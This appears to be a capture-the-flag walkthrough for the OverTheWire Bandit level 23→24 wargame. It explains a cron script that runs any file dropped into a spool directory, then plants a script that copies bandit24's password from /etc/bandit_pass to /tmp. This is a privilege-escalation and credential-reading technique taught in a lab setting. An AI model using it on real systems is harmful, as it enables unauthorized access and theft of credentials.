log into bandit 23 using the 23rd password

---

Another cron-based level, but this time the cron script accepts and executes arbitrary scripts dropped into a spool directory — as long as they're owned by bandit23.

check the cron job
Code: ``cat /etc/cron.d/cronjob_bandit24``

check what the script does
Code: ``cat /usr/bin/cronjob_bandit24.sh``
Output:
*#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done*

Breaking this down:
1. Runs as **bandit24** (per the cron.d entry), every minute.
2. `cd`s into `/var/spool/bandit24/foo`.
3. Loops over every file in that directory.
4. For each file, checks if it's **owned by bandit23** — if so, executes it with a 60-second timeout.
5. Deletes the file afterward regardless of whether it ran.

Since it runs as bandit24 but only executes files owned by bandit23, and we're logged in as bandit23 — any file we drop in there will automatically be owned by us and will get executed as bandit24.

---

navigate to the spool directory
Code: ``cd /var/spool/bandit24/foo``
Code: ``ls``
Output:
*ls: cannot open directory '.': Permission denied*

Can't list the directory, but we can still write into it — that's all we need.

---

first attempt (wrong): tried running the cron script manually to test it
Code: ``sh /usr/bin/cronjob_bandit24.sh``
Output:
*.../cronjob_bandit24.sh: 3: shopt: Permission denied
.../cronjob_bandit24.sh: 7: cd: can't cd to /var/spool/bandit23/foo*

Same trap as bandit23's level: running the script yourself makes `whoami` resolve to **you** (bandit23), not bandit24 — so it looks for `/var/spool/bandit23/foo`, which doesn't exist. This script must be triggered by the real cron job running as bandit24, not run manually.

Also briefly mixed this up with the *previous* level's md5sum-filename trick (`echo I am user $myname | md5sum`) — that pattern was specific to bandit23's cron script and doesn't apply here. This level's script has no dynamic filename; it just executes whatever it finds.

---

write a payload script in the spool directory, reusing the same password-dump logic as the bandit22/23 levels

Code: ``vi temp.sh``
Content:
*#!/bin/bash
myname=$(whoami)
mytarget=Pass24
echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"
cat /etc/bandit_pass/$myname > /tmp/$mytarget*

When this runs as bandit24 (via cron), `whoami` will correctly resolve to bandit24, and it'll dump bandit24's password to a fixed, predictable location we can read from bandit23.

make it executable — required since the cron script calls it with `timeout -s 9 60 "./$i"`
Code: ``chmod +x temp.sh``

wait ~60 seconds for cron to pick it up and run it as bandit24

read the result
Code: ``cat /tmp/Pass24``
Output:
*<24th password>*

save the 24th password
